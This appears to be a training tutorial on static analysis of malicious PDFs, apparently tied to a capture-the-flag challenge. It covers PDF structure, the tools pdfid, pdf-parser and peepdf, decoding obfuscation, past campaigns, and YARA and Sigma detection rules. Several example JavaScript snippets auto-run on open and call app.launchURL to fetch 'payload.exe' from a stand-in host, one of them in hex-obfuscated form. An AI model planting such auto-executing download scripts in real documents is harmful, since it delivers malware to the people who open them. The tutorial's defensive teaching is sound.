# PDF Malware Analysis - Static Analysis Techniques

## Table of Contents
1. [Introduction](#introduction)
2. [Why PDFs are Weaponized](#why-pdfs-are-weaponized)
3. [PDF Structure Basics](#pdf-structure-basics)
4. [Common Attack Vectors](#common-attack-vectors)
5. [PDF Analysis Tools](#pdf-analysis-tools)
6. [Hands-On Analysis Workflow](#hands-on-analysis-workflow)
7. [Decoding Techniques](#decoding-techniques)
8. [Real-World Campaigns](#real-world-campaigns)
9. [Detection and Prevention](#detection-and-prevention)
10. [Safe Analysis Practices](#safe-analysis-practices)

---

## Introduction

**What is PDF Malware Analysis?**

PDF malware analysis is the process of examining suspicious PDF files to identify malicious content **without executing the file**. This is called **static analysis** - we tear apart the PDF's structure to find hidden payloads, malicious JavaScript, embedded executables, or command-and-control infrastructure.

**Why is this important?**

- PDF files are one of the most common malware delivery methods
- Email attachments, downloads, and document sharing all use PDFs
- Users trust PDFs as "just documents" and open them without suspicion
- Modern PDF readers have many features that can be exploited
- Attackers use PDFs for initial access, data exfiltration, and persistence

**What you'll learn:**

✅ How PDFs work internally
✅ How to identify suspicious PDF elements
✅ Using tools like `pdfid`, `pdf-parser`, and `peepdf`
✅ Extracting and decoding obfuscated payloads
✅ Understanding real-world PDF attacks
✅ How to safely analyze malicious documents

---

## Why PDFs are Weaponized

### Advantages for Attackers

**1. Ubiquitous and Trusted**
- PDFs are everywhere - resumes, invoices, reports, contracts
- Users expect to receive PDFs and open them without hesitation
- "It's just a document" - low perceived risk

**2. Rich Feature Set**
- JavaScript execution
- Form data and actions
- Embedded files and streams
- External content loading
- Automatic actions (OpenAction, AA)

**3. Complex Format**
- Binary format with compressed streams
- Multiple encoding layers (hex, Base64, FlateDecode)
- Easy to hide malicious content
- Difficult for humans to read raw PDF structure

**4. Cross-Platform**
- Works on Windows, macOS, Linux
- Multiple PDF readers (Adobe, Foxit, Chrome, Edge)
- Mobile devices support PDFs
- Consistent attack surface across platforms

### Attack Objectives

Attackers use weaponized PDFs to:

- **Deliver malware** - Download and execute payloads
- **Exploit vulnerabilities** - Adobe Reader 0-days
- **Steal credentials** - Phishing forms, fake login pages
- **Exfiltrate data** - Send form data to C2 servers
- **Establish persistence** - Launch scripts, modify registry
- **Social engineering** - Convince user to enable macros/content

---

## PDF Structure Basics

### How PDFs Work

A PDF file is a structured document with:

**1. Header**
```
%PDF-1.7
```
Defines the PDF version.

**2. Body (Objects)**
The main content - text, images, JavaScript, metadata. Each object has a number:

```
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
```

**3. Cross-Reference Table (xref)**
An index of where each object is located in the file.

**4. Trailer**
Points to the root object (Catalog) and metadata.

### Object Types

PDFs contain different types of objects:

| Object Type | Purpose | Malicious Use |
|-------------|---------|---------------|
| `/Catalog` | Root of PDF document tree | Entry point for attacks |
| `/Pages` | Page structure | - |
| `/JavaScript` or `/JS` | JavaScript code | **MALICIOUS - executes code** |
| `/OpenAction` or `/AA` | Automatic actions | **MALICIOUS - auto-execute on open** |
| `/AcroForm` | Form data | Steal data, phishing |
| `/EmbeddedFile` | Embedded files | **MALICIOUS - hide executables** |
| `/ObjStm` | Object streams | **MALICIOUS - hide content** |
| `/Filter` | Compression (FlateDecode, etc.) | Obfuscate content |

### Example: Simple PDF Object

```
5 0 obj
<<
  /Type /Action
  /S /JavaScript
  /JS (app.alert('Hello World');)
>>
endobj
```

This object contains JavaScript that shows an alert. In malicious PDFs, the JavaScript would download malware or exfiltrate data.

### Streams and Filters

**Streams** contain the actual data (images, fonts, JavaScript code):

```
7 0 obj
<< /Filter /FlateDecode /Length 1234 >>
stream
[compressed binary data]
endstream
endobj
```

**Filters** compress or encode data:
- `/FlateDecode` - Zlib compression (most common)
- `/ASCIIHexDecode` - Hex encoding
- `/ASCII85Decode` - Base85 encoding
- `/LZWDecode` - LZW compression

**Why attackers use filters:**
- Hides malicious code from simple text searches
- Requires decompression to analyze
- Multiple layers of encoding make analysis harder

---

## Common Attack Vectors

### 1. Malicious JavaScript

**How it works:**
- PDF contains embedded JavaScript
- Executes when PDF is opened (`/OpenAction`)
- JavaScript can:
  - Download malware from URLs
  - Exploit Adobe Reader vulnerabilities
  - Send data to C2 servers
  - Launch external applications

**Example:**
```javascript
var url = "http://malicious.com/payload.exe";
app.launchURL(url, true);
```

**Detection:**
Look for `/JS` or `/JavaScript` objects in the PDF.

---

### 2. Automatic Actions (OpenAction)

**How it works:**
- `/OpenAction` or `/AA` (Additional Actions) execute automatically
- No user interaction required
- Can trigger JavaScript, launch URLs, or run embedded code

**Example:**
```
<< /Type /Catalog
   /OpenAction << /S /JavaScript /JS (malicious code here) >>
>>
```

**Detection:**
Look for `/OpenAction` or `/AA` in `pdfid` output.

---

### 3. Embedded Executables

**How it works:**
- PDF embeds a `.exe`, `.bat`, or script file
- User is prompted to "Open attached file"
- Social engineering convinces them to run it

**Example:**
```
<< /Type /EmbeddedFile
   /EF << /F 8 0 R >>
   /Subtype /application#2Fx-msdos-program
>>
```

**Detection:**
Look for `/EmbeddedFile` in `pdfid` output.

---

### 4. Obfuscated Payloads

**How it works:**
- Malicious code is hex-encoded, Base64-encoded, or compressed
- Requires decoding to reveal true intent
- Multiple encoding layers (hex → Base64 → FlateDecode)

**Example:**
```javascript
var x = unescape("%75%72%6C"); // "url"
var y = "aHR0cDovL21hbGljaW91cy5jb20="; // Base64
```

**Detection:**
Look for encoding functions: `unescape()`, `atob()`, `String.fromCharCode()`, `eval()`.

---

### 5. Exploit Payloads

**How it works:**
- Targets specific Adobe Reader vulnerabilities (CVEs)
- Shellcode embedded in PDF streams
- Exploits buffer overflows, use-after-free bugs, etc.
- Gains code execution on victim's machine

**Examples:**
- **CVE-2010-0188** - Buffer overflow in `libtiff`
- **CVE-2013-2729** - Buffer overflow in Adobe Reader
- **CVE-2018-4990** - Use-after-free in Adobe Acrobat
- **CVE-2021-28550** - Use-after-free in Adobe Acrobat DC

**Detection:**
Look for abnormal streams, heap spray patterns, shellcode signatures.

---

## PDF Analysis Tools

### Tool 1: PDFiD

**What it does:**
Quickly identifies suspicious PDF elements without extracting them.

**Installation:**
```bash
pip3 install pdfid-python
```

**Usage:**
```bash
pdfid malicious.pdf
```

**Example Output:**
```
PDFiD 0.2.7 malicious.pdf
 PDF Header: %PDF-1.7
 obj                   23
 endobj                23
 stream                 8
 endstream              8
 /Page                  3
 /Encrypt               0
 /ObjStm                0
 /JS                    2    ← SUSPICIOUS! JavaScript present
 /JavaScript            2    ← SUSPICIOUS!
 /AA                    1    ← SUSPICIOUS! Auto-action
 /OpenAction            1    ← SUSPICIOUS! Auto-execute
 /AcroForm              0
 /JBIG2Decode           0
 /RichMedia             0
 /Launch                0
 /EmbeddedFile          0
 /XFA                   0
```

**What to look for:**
- `/JS` or `/JavaScript` > 0 → Contains JavaScript (SUSPICIOUS)
- `/OpenAction` or `/AA` > 0 → Auto-executes on open (VERY SUSPICIOUS)
- `/EmbeddedFile` > 0 → Contains embedded files (SUSPICIOUS)
- `/JBIG2Decode` > 0 → Exploited in the past (SUSPICIOUS)
- `/Launch` > 0 → Can launch external programs (VERY SUSPICIOUS)

**Red Flags:**
Any of the following indicates a potentially malicious PDF:
- JavaScript + OpenAction (auto-execute script)
- EmbeddedFile (hidden executables)
- Launch (runs external programs)

---

### Tool 2: PDF-Parser

**What it does:**
Extracts and displays specific PDF objects, streams, and JavaScript code.

**Installation:**
```bash
pip3 install pdf-parser-python
```

**Usage:**

**Search for JavaScript:**
```bash
pdf-parser --search javascript malicious.pdf
```

**Extract specific object:**
```bash
pdf-parser --object 5 malicious.pdf
```

**Extract with decompression:**
```bash
pdf-parser --object 7 --filter malicious.pdf
```

**Save extracted content:**
```bash
pdf-parser --object 5 --raw malicious.pdf > extracted.txt
```

**Example Output:**
```
obj 5 0
 Type: /Action
 Referencing: 6 0 R

  <<
    /Type /Action
    /S /JavaScript
    /JS 6 0 R
  >>
```

**Common Flags:**
- `--search <keyword>` - Search for keywords (javascript, openaction, etc.)
- `--object <number>` - Extract specific object by number
- `--filter` - Decompress streams (FlateDecode, etc.)
- `--raw` - Output raw content without formatting
- `--stats` - Show statistics about the PDF

---

### Tool 3: Peepdf

**What it does:**
Interactive PDF analysis tool with built-in decoding and JavaScript analysis.

**Installation:**
```bash
pip3 install peepdf-fork
```

**Usage:**

**Interactive mode:**
```bash
peepdf -i malicious.pdf
```

**Commands in interactive mode:**
```
PPDF> tree           # Show object tree
PPDF> object 5       # View object 5
PPDF> stream 7       # View stream 7 (decompressed)
PPDF> js_code        # Extract all JavaScript
PPDF> metadata       # Show PDF metadata
PPDF> search js      # Search for JavaScript
```

**Force analysis mode (disable JavaScript execution):**
```bash
peepdf -f malicious.pdf
```

**Extract JavaScript to file:**
```bash
peepdf -j malicious.pdf > javascript.txt
```

**Why use peepdf:**
- Interactive exploration
- Built-in JavaScript beautifier
- Automatic decoding of common encodings
- Vulnerability detection (CVE scanning)

---

### Comparison Table

| Tool | Best For | Pros | Cons |
|------|----------|------|------|
| **pdfid** | Quick triage | Fast, shows suspicious elements at a glance | Doesn't extract content |
| **pdf-parser** | Object extraction | Granular control, scripting-friendly | Requires knowing object numbers |
| **peepdf** | Interactive analysis | User-friendly, built-in decoders | Can be slow on large PDFs |

**Recommended Workflow:**
1. Run `pdfid` to identify suspicious elements
2. Use `pdf-parser` to extract specific objects
3. Use `peepdf` for interactive exploration if needed

---

## Hands-On Analysis Workflow

### Step-by-Step Process

**Step 1: Initial Triage**

Run `pdfid` to get an overview:

```bash
pdfid suspicious.pdf
```

Look for:
- JavaScript (`/JS`, `/JavaScript`)
- Auto-actions (`/OpenAction`, `/AA`)
- Embedded files (`/EmbeddedFile`)
- Launch actions (`/Launch`)

**Step 2: Search for JavaScript**

```bash
pdf-parser --search javascript suspicious.pdf
```

Example output:
```
obj 5 0
 Type: /Action
 Referencing: 6 0 R

  <<
    /S /JavaScript
    /JS 6 0 R
  >>
```

This tells us object 6 contains the JavaScript code.

**Step 3: Extract JavaScript Object**

```bash
pdf-parser --object 6 suspicious.pdf
```

Example output:
```
obj 6 0
 Type:
 Referencing:

  <<
    /Length 1234
    /Filter /FlateDecode
  >>

  [compressed data]
```

The JavaScript is compressed with `/FlateDecode`.

**Step 4: Decompress the Stream**

```bash
pdf-parser --object 6 --filter suspicious.pdf
```

Example output (decompressed JavaScript):
```javascript
var _0x4a2b = ["\x68\x74\x74\x70\x3a\x2f\x2f"];
var url = _0x4a2b[0] + "malicious.com/payload.exe";
app.launchURL(url, true);
```

**Step 5: Decode Obfuscated Content**

The JavaScript uses hex escapes (`\x68\x74...`). Decode them:

Method 1: Python
```python
hex_string = "\x68\x74\x74\x70\x3a\x2f\x2f"
print(hex_string)
# Output: http://
```

Method 2: CyberChef
1. Go to https://gchq.github.io/CyberChef/
2. Paste: `\x68\x74\x74\x70\x3a\x2f\x2f`
3. Recipe: "From Hex" → "Auto Bake"
4. Result: `http://`

**Step 6: Analyze the Payload**

Decoded JavaScript:
```javascript
var url = "http://malicious.com/payload.exe";
app.launchURL(url, true);
```

**Analysis:**
- **Attack:** Downloads `payload.exe` from malicious domain
- **C2 Server:** `malicious.com`
- **Method:** Uses Adobe's `app.launchURL()` API
- **Impact:** User gets infected when PDF opens

**Step 7: Document Findings**

Create an analysis report:
```
MALICIOUS PDF ANALYSIS REPORT
=============================

File: suspicious.pdf
Hash: [MD5/SHA256]
Verdict: MALICIOUS

Indicators of Compromise:
- JavaScript object (obj 6)
- OpenAction triggers on PDF open
- Downloads malware from http://malicious.com/payload.exe

Attack Chain:
1. User opens PDF
2. OpenAction triggers JavaScript (obj 5)
3. JavaScript decodes URL
4. app.launchURL() downloads payload.exe
5. User is prompted to run executable

Recommendation: BLOCK and QUARANTINE
```

---

## Decoding Techniques

### Common Encoding Methods

**1. Hex Encoding**

**Example:**
```javascript
var x = "\x48\x65\x6c\x6c\x6f";  // "Hello"
```

**Decode with Python:**
```python
hex_string = "\\x48\\x65\\x6c\\x6c\\x6f"
decoded = bytes.fromhex(hex_string.replace('\\x', '')).decode('utf-8')
print(decoded)  # Hello
```

**Decode with CyberChef:**
Recipe: `From Hex` (delimiter: `\x`)

---

**2. Octal Encoding**

**Example:**
```javascript
var x = "\110\145\154\154\157";  // "Hello"
```

**Decode with Python:**
```python
octal_string = "\\110\\145\\154\\154\\157"
decoded = ''.join(chr(int(code, 8)) for code in octal_string.split('\\')[1:])
print(decoded)  # Hello
```

---

**3. Base64 Encoding**

**Example:**
```javascript
var x = atob("SGVsbG8=");  // "Hello"
```

**Decode with Bash:**
```bash
echo "SGVsbG8=" | base64 -d
```

**Decode with CyberChef:**
Recipe: `From Base64`

---

**4. URL Encoding**

**Example:**
```javascript
var x = unescape("%48%65%6C%6C%6F");  // "Hello"
```

**Decode with Python:**
```python
from urllib.parse import unquote
decoded = unquote("%48%65%6C%6C%6F")
print(decoded)  # Hello
```

**Decode with CyberChef:**
Recipe: `URL Decode`

---

**5. String.fromCharCode()**

**Example:**
```javascript
var x = String.fromCharCode(72, 101, 108, 108, 111);  // "Hello"
```

**Decode with Python:**
```python
codes = [72, 101, 108, 108, 111]
decoded = ''.join(chr(c) for c in codes)
print(decoded)  # Hello
```

---

**6. XOR Encoding**

**Example:**
```javascript
function decode(s, key) {
    var result = "";
    for(var i = 0; i < s.length; i++) {
        result += String.fromCharCode(s.charCodeAt(i) ^ key);
    }
    return result;
}
var x = decode("encoded_string", 0x42);
```

**Decode with Python:**
```python
def xor_decode(data, key):
    return ''.join(chr(ord(c) ^ key) for c in data)

decoded = xor_decode("encoded_string", 0x42)
print(decoded)
```

---

### Multi-Layer Decoding

Attackers often use multiple encoding layers:

**Example:**
```javascript
var a = "\x61\x74\x6f\x62";  // Hex → "atob"
var b = window[a]("U0dWc2JHOD0=");  // Base64 → "SGVsbG8="
var c = window[a](b);  // Base64 → "Hello"
```

**Decode in stages:**
1. Hex decode: `\x61\x74\x6f\x62` → `atob`
2. Base64 decode: `U0dWc2JHOD0=` → `SGVsbG8=`
3. Base64 decode: `SGVsbG8=` → `Hello`

---

## Real-World Campaigns

### Campaign 1: APT28 (Fancy Bear) - PDF with Flash Exploits

**Timeline:** 2015-2017

**Attack:**
- Spear-phishing emails with weaponized PDFs
- Embedded Flash objects (SWF files)
- Exploited Flash vulnerabilities (CVE-2015-7645, CVE-2016-1019)
- Delivered CHOPSTICK and EVILTOSS malware

**Targets:**
- Government agencies
- Military organizations
- Political campaigns

**Detection:**
```bash
pdfid document.pdf
# Look for /RichMedia, /Flash, /EmbeddedFile
```

---

### Campaign 2: DarkHotel APT - Targeted PDFs

**Timeline:** 2014-2016

**Attack:**
- Targeted business travelers in luxury hotels
- PDFs with Adobe Flash 0-day exploits
- Downloaded keyloggers and info-stealers

**Targets:**
- CEOs and executives
- Government officials
- Defense contractors

**Techniques:**
- Watering hole attacks (compromised hotel Wi-Fi)
- Spear-phishing with "hotel information" PDFs
- Persistence via registry modification

---

### Campaign 3: Carberp Banking Trojan

**Timeline:** 2010-2013

**Attack:**
- PDFs with malicious JavaScript
- JavaScript downloaded Carberp banking trojan
- Stole online banking credentials

**Attack Chain:**
1. Email: "Invoice.pdf"
2. User opens PDF
3. JavaScript downloads `invoice.exe`
4. Carberp steals banking credentials

**Detection:**
```bash
pdf-parser --search javascript invoice.pdf
# Look for app.launchURL(), getURL()
```

---

### Campaign 4: Emotet - PDF Attachments

**Timeline:** 2018-2021

**Attack:**
- Email with PDF attachment
- PDF contains links to malicious Word documents
- Word docs download Emotet payload

**Attack Chain:**
1. Phishing email: "Payment_Receipt.pdf"
2. PDF contains: "Click here to view full receipt"
3. Link downloads Word doc with macros
4. Macros download Emotet

**Social Engineering:**
- Spoofed invoices, receipts, shipping notifications
- Urgency: "Overdue payment", "Failed delivery"

---

## Detection and Prevention

### For Security Teams

**1. Email Gateway Filtering**
- Scan PDFs with `pdfid` at email gateway
- Block PDFs with `/JavaScript` + `/OpenAction`
- Quarantine PDFs with `/EmbeddedFile` or `/Launch`

**2. Endpoint Detection**
- Monitor for Adobe Reader spawning suspicious processes
- Alert on `AcroRd32.exe` → `cmd.exe` → `powershell.exe`
- Detect downloads from Adobe processes

**3. Network Monitoring**
- Detect PDF readers making HTTP requests
- Alert on C2 beaconing patterns
- Monitor for data exfiltration

**4. User Training**
- Don't open PDFs from unknown senders
- Be suspicious of unexpected attachments
- Report suspicious documents to security team

---

### For Analysts

**YARA Rules for PDF Malware:**

```yara
rule Malicious_PDF_JavaScript
{
    meta:
        description = "Detects PDFs with auto-executing JavaScript"
    strings:
        $pdf_header = "%PDF"
        $js1 = "/JavaScript"
        $js2 = "/JS"
        $openaction = "/OpenAction"
    condition:
        $pdf_header at 0 and ($js1 or $js2) and $openaction
}
```

**Sigma Rules:**

```yaml
title: Adobe Reader Spawning Suspicious Process
status: experimental
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 1
        ParentImage|endswith: '\AcroRd32.exe'
        Image|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
            - '\wscript.exe'
    condition: selection
```

---

## Safe Analysis Practices

### Golden Rules

**1. NEVER Open the PDF in a Normal PDF Reader**
- Use static analysis tools only
- Don't double-click the PDF
- Don't use Adobe Reader, Foxit, Chrome, etc.

**2. Use an Isolated Environment**
- Virtual machine (snapshot before analysis)
- Sandbox (Cuckoo, ANY.RUN, Hybrid Analysis)
- Isolated network (no internet access)

**3. Disable JavaScript in PDF Readers**
If you MUST open a PDF:
```
Adobe Reader → Edit → Preferences → JavaScript → Uncheck "Enable JavaScript"
```

**4. Use Analysis VMs**
- REMnux Linux (pre-configured malware analysis tools)
- FLARE VM (Windows malware analysis)
- Take VM snapshots before analysis

**5. Verify File Hashes**
Check if the PDF is known malware:
```bash
md5sum suspicious.pdf
# Search hash on VirusTotal, MalwareBazaar
```

---

### Analysis Checklist

Before analyzing a suspicious PDF:

- [ ] Am I in an isolated VM or sandbox?
- [ ] Is the VM snapshotted (can I revert)?
- [ ] Is the network disconnected or monitored?
- [ ] Do I have the right tools installed? (pdfid, pdf-parser, peepdf)
- [ ] Am I using static analysis (not opening the PDF)?
- [ ] Have I checked the hash on VirusTotal?
- [ ] Do I have a place to document findings?

---

## Conclusion

You now understand:

✅ **PDF structure** - Objects, streams, filters, actions
✅ **Attack vectors** - JavaScript, OpenAction, embedded files, exploits
✅ **Analysis tools** - pdfid, pdf-parser, peepdf
✅ **Workflow** - Triage → Extract → Decode → Analyze
✅ **Decoding** - Hex, Base64, XOR, multi-layer obfuscation
✅ **Real attacks** - APT28, DarkHotel, Carberp, Emotet
✅ **Detection** - YARA rules, Sigma rules, network monitoring
✅ **Safe practices** - Isolated VMs, static analysis, never execute

**Next Steps:**

Apply these skills in the Day 12 challenge to analyze Jack Frost's weaponized PDF and find the hidden flag!

---

## Additional Resources

**PDF Specifications:**
- Adobe PDF Reference: https://www.adobe.com/devnet/pdf/pdf_reference.html
- PDF Format Overview: https://en.wikipedia.org/wiki/PDF

**Analysis Guides:**
- Didier Stevens' PDF Tools: https://blog.didierstevens.com/programs/pdf-tools/
- Lenny Zeltser's Malicious PDF Analysis: https://zeltser.com/analyzing-malicious-documents/
- SANS Malicious PDF Analysis: https://www.sans.org/reading-room/whitepapers/incident/malicious-pdf-analysis-33193

**Tools:**
- PDFiD: https://github.com/DidierStevens/DidierStevensSuite
- PDF-Parser: https://github.com/DidierStevens/DidierStevensSuite
- Peepdf: https://github.com/jesparza/peepdf
- CyberChef: https://gchq.github.io/CyberChef/

**Practice:**
- Contagio Malware Dump: http://contagiodump.blogspot.com/
- MalwareBazaar: https://bazaar.abuse.ch/
- ANY.RUN Sandbox: https://app.any.run/

**CVE Databases:**
- Adobe Security Bulletins: https://helpx.adobe.com/security.html
- NIST NVD: https://nvd.nist.gov/

---

**Ready to apply these skills? Head back to the Day 12 challenge!** 🎄
